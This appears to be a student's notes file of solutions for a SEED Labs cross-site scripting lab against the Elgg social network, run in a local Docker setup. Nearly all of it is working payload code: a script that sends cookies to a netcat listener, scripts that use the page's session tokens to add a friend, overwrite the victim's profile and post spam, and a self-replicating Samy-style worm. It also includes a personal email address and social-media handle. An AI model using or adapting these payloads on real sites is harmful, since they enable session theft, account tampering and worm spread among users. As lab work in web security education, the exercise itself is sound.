@@ -1,0 +1,211 @@
+Setup your environemnt:
+-------------------------------------------------------------------------------
+Adding DNS records:
+sudo su
+chmod 777 hosts
+mousepad hosts
+<copy paste the following record and save>
+10.9.0.5 www.seed-server.com
+
+Get labsetup files
+wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_XSS_Elgg/Labsetup.zip
+docker-compose build
+docker-compose up
+
+Practice Scripts:
+-------------------------------------------------------------------------------
+P 1:
+<script>alert('XSS');</script>
+
+P 2:
+<script>alert(document.cookie);</script>
+
+P 3:
+nc -lknv 5555
+
+<script>document.write('<img src=http://127.0.0.1:5555?c='
++ escape(document.cookie) + ' >');
+</script> 
+
+Task 1:
+-------------------------------------------------------------------------------- 
+<script type="text/javascript">
+	window.onload = function () {
+  if(elgg.session.user.guid == 59){
+    return;
+  }
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the HTTP request to add Samy as a friend.
+
+	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; //FILL IN
+
+	//Create and send Ajax request to add friend
+	Ajax=new XMLHttpRequest();
+	Ajax.open("GET",sendurl,true);
+	Ajax.setRequestHeader("Host","www.seed-server.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+	Ajax.send();
+	}
+</script>
+
+Task 2:
+<script type="text/javascript">
+	window.onload = function(){
+	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+	//and Security Token __elgg_token
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the content of your url.
+    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
+
+  var keys = ["__elgg_token", "__elgg_ts", "name", "description", "briefdescription", "accesslevel[briefdescription]", "location", "accesslevel[location]", "interests", "accesslevel[interests]", "skills", "accesslevel[skills]", "contactemail", "accesslevel[contactemail]", "phone", "accesslevel[phone]", "mobile", "accesslevel[mobile]", "website", "accesslevel[website]", "twitter", "accesslevel[twitter]", "guid"];
+
+  var values = [token, ts, "Samy", "Samy hacked you", "1905004", "1", "ECE", "1", "Hacking", "1", "Hacking", "1", "asifazad0178@gmail.com", "1", "0178", "1", "0178", "1", "https://www.facebook.com/asifazad0178", "1", "asifazad0178", "1", elgg.session.user.guid];
+
+	var content="";
+  for (var i = 0; i < keys.length; i++) {
+    content += keys[i] + "=" + values[i] + "&";
+  }
+	
+	if(elgg.session.user.guid != 59)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+	}
+</script>
+
+Task 3:
+<script type="text/javascript">
+	window.onload = function(){
+	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+	//and Security Token __elgg_token
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+  var body = "To earn 12 USD/hour, visit now http://www.seed-server.com/profile/samy";
+	//Construct the content of your url.
+    var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
+
+  var keys = ["__elgg_token", "__elgg_ts","body"] 
+  var values = [token, ts, body]; 
+
+	var content="";
+  for (var i = 0; i < keys.length; i++) {
+    content += keys[i] + "=" + values[i] + "&";
+  }
+	
+	if(elgg.session.user.guid != 59)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+	}
+</script>
+
+Task 4:
+
+<script id=worm type="text/javascript">
+	window.onload = function () {
+  if(elgg.session.user.guid == 59){
+    return;
+  }
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the HTTP request to add Samy as a friend.
+
+	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; //FILL IN
+
+	//Create and send Ajax request to add friend
+	Ajax=new XMLHttpRequest();
+	Ajax.open("GET",sendurl,true);
+	Ajax.setRequestHeader("Host","www.seed-server.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+	Ajax.send();
+	}
+</script>
+
+
+<script id=worm>
+	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+	var jsCode = document.getElementById("worm").innerHTML;
+	var tailTag = "</" + "script>";
+	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+	alert(jsCode);
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+  function replicate_worm()
+  {
+	//Construct the content of your url.
+    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
+
+  var keys = ["__elgg_token", "__elgg_ts", "name", "description", "briefdescription", "accesslevel[briefdescription]", "location", "accesslevel[location]", "interests", "accesslevel[interests]", "skills", "accesslevel[skills]", "contactemail", "accesslevel[contactemail]", "phone", "accesslevel[phone]", "mobile", "accesslevel[mobile]", "website", "accesslevel[website]", "twitter", "accesslevel[twitter]", "guid"];
+
+  var values = [token, ts, elgg.session.user.name, jsCode, "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", elgg.session.user.guid];
+
+	var content="";
+  for (var i = 0; i < keys.length; i++) {
+    content += keys[i] + "=" + values[i] + "&";
+  }
+	
+	if(elgg.session.user.guid != 59)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+
+  }
+
+  function propagate_worm(){
+  var body = "To earn 12 USD/hour, visit now " + elgg.session.user.url;
+	//Construct the content of your url.
+    var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
+
+  var keys = ["__elgg_token", "__elgg_ts","body"] 
+  var values = [token, ts, body]; 
+
+	var content="";
+  for (var i = 0; i < keys.length; i++) {
+    content += keys[i] + "=" + values[i] + "&";
+  }
+	
+	if(elgg.session.user.guid != 59)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+
+  }
+
+	window.onload = function(){
+    replicate_worm();
+    propagate_worm();
+}
+</script>
